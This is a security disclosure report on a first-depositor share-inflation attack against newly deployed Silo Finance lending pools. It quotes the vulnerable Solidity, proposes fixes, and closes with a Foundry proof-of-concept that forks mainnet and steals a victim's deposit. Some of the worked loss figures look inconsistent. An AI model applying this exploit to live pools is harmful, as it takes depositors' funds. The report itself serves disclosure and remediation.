# New silo creation can be backrun by a hacker who wants to become a first depositor and steal subsequent depositor's asset.

## Bug Description
Let's imagine a situation that new `Silo` is deployed by `SiloRepository.newSilo()` function.
A hacker can create a bot that watches memepool and backrun this tx with malicous deposit tx to become a first depositor.

https://github.com/silo-finance/silo-core-v1/blob/master/contracts/SiloRepository.sol#L415-L420
```solidity
    function newSilo(address _siloAsset, bytes memory _siloData) external override returns (address) {
        bool assetIsABridge = _bridgeAssets.contains(_siloAsset);
        ensureCanCreateSiloFor(_siloAsset, assetIsABridge);
        
        return _createSilo(_siloAsset, getVersionForAsset[_siloAsset], assetIsABridge, _siloData);
    }
```

When making a deposit, depositor's share is calculated as following.

https://github.com/silo-finance/silo-core-v1/blob/master/contracts/lib/EasyMath.sol#L9-L11
```solidity
    function toShare(uint256 amount, uint256 totalAmount, uint256 totalShares) internal pure returns (uint256) {
        if (totalShares == 0 || totalAmount == 0) {
            return amount;
        }

        uint256 result = amount * totalShares / totalAmount;

        // Prevent rounding error
        if (result == 0 && amount != 0) {
            revert ZeroShares();
        }

        return result;
    }
```

https://github.com/silo-finance/silo-core-v1/blob/master/contracts/BaseSilo.sol#L332-L340
```solidity
    function _deposit(
        address _asset,
        address _from,
        address _depositor,
        uint256 _amount,
        bool _collateralOnly
    )
        internal
        nonReentrant
        validateMaxDepositsAfter(_asset)
        returns (uint256 collateralAmount, uint256 collateralShare)
    {
        ...
        if (_collateralOnly) {
            collateralShare = _amount.toShare(totalDepositsCached, _state.collateralOnlyToken.totalSupply());
            _state.collateralOnlyDeposits = totalDepositsCached + _amount;
            _state.collateralOnlyToken.mint(_depositor, collateralShare);
        } else {
            collateralShare = _amount.toShare(totalDepositsCached, _state.collateralToken.totalSupply());
            _state.totalDeposits = totalDepositsCached + _amount;
            _state.collateralToken.mint(_depositor, collateralShare);
        }
        ...
    }
```

A malicious first depositor can `deposit()` with `1 wei` of asset token as the first depositor of the `Silo`, and get `1 wei` of shares.

Then the attacker can send `10000e18 - 1` of asset tokens to the silo and inflate the price per share from 1.0000 to an extreme value of 10000e18 ( from `(1 + 10000e18 - 1) / 1`) .

There are two sceanarios for future depositor

- If future depositor's deposit amount >= 10000e18, e.g 20000e18 - 1

```
returned share = `1 wei` (from `20000e18 - 1 / 10000e18`)

totalSupply = 2

asset balance = 30000e18 - 1

price per share = 15000e18

attacker' profit = 5000e18

victim's loss =  5000e18
```

- Future depositor's deposit amount < 10000e18, e.g 10000e18 - 1
```
returned share = `0 wei` (from `(10000e18 - 1) / 10000e18`)

silo's totalSupply = 1

asset balance = 20000e18 - 1

price per share = 25000e18 - 1

attacker' profit = 1000e18 - 1

victim's loss =  1000e18 - 1
```

## Impact

The attacker can profit from future users' deposits while the late users will lose part of their funds to the attacker.

## Recommendation
1) When creating new silo, make a small deposit for 0x0 address, it will make difficult for hackers to manipulate price.

https://github.com/silo-finance/silo-core-v1/blob/master/contracts/SiloRepository.sol#L415-L420
```solidity
    function newSilo(address _siloAsset, bytes memory _siloData) external override returns (address) {
        bool assetIsABridge = _bridgeAssets.contains(_siloAsset);
        ensureCanCreateSiloFor(_siloAsset, assetIsABridge);
        
        Silo createdSilo = _createSilo(_siloAsset, getVersionForAsset[_siloAsset], assetIsABridge, _siloData);
+       createdSilo.deposit(_siloAsset, 1000, address(0), false);
        return createdSilo;
    }
```

2) `BaseSilo._deposit()` Should check if newly minted share is non-zero.
https://github.com/silo-finance/silo-core-v1/blob/master/contracts/BaseSilo.sol#L332-L340
```solidity
    function _deposit(
        address _asset,
        address _from,
        address _depositor,
        uint256 _amount,
        bool _collateralOnly
    )
        internal
        nonReentrant
        validateMaxDepositsAfter(_asset)
        returns (uint256 collateralAmount, uint256 collateralShare)
    {
        ...
        if (_collateralOnly) {
            collateralShare = _amount.toShare(totalDepositsCached, _state.collateralOnlyToken.totalSupply());
+            require(collateralShare > 0, "Zero shares");
            _state.collateralOnlyDeposits = totalDepositsCached + _amount;
            _state.collateralOnlyToken.mint(_depositor, collateralShare);
        } else {
            collateralShare = _amount.toShare(totalDepositsCached, _state.collateralToken.totalSupply());
+            require(collateralShare > 0, "Zero shares");
            _state.totalDeposits = totalDepositsCached + _amount;
            _state.collateralToken.mint(_depositor, collateralShare);
        }
        ...
    }
```

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface ISilo is IERC20 {
    function deposit(address _asset, uint256 _amount, bool _collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function withdraw(address _asset, uint256 _amount, bool _collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
}

interface ISiloRepository {
    function newSilo(address _siloAsset, bytes memory _siloData) external returns (address);
}

contract ContractTest is DSTest {
    CheatCodes  cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address     attacker = 0xAA061822B7975577c5E4810257427a5b08Ba4b38;
    address     victim = 0x210C9E1d9E0572da30B2b8b9ca57E5e380528534;
    address     siloRepository = 0xd998C35B7900b344bbBe6555cc11576942Cf309d;
    address     asset = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  function setUp() public {
    cheats.createSelectFork("mainnet", 17776926); 
  }

  function testExploit() public {
    uint256 withdrawnAmount;

    ISilo silo = ISilo(ISiloRepository(siloRepository).newSilo(asset, new bytes(0)));
    emit log_named_address("New silo", address(silo));

    cheats.startPrank(attacker);
    silo.deposit(asset, 1, false);
    IERC20(asset).transfer(address(silo), 10000 ether - 1);
    emit log("Attacker depsoit");

    cheats.startPrank(victim);
    silo.deposit(asset, 20000 ether - 1, false);
    emit log("Victim depsoit");

    cheats.startPrank(attacker);
    (withdrawnAmount, ) = silo.withdraw(asset, type(uint256).max, false);
    emit log_named_uint("Attacker withdrawn amount", withdrawnAmount);

    cheats.startPrank(victim);
    (withdrawnAmount, ) = silo.withdraw(asset, type(uint256).max, false);
    emit log_named_uint("Victim withdrawn amount", withdrawnAmount);
  }
}

```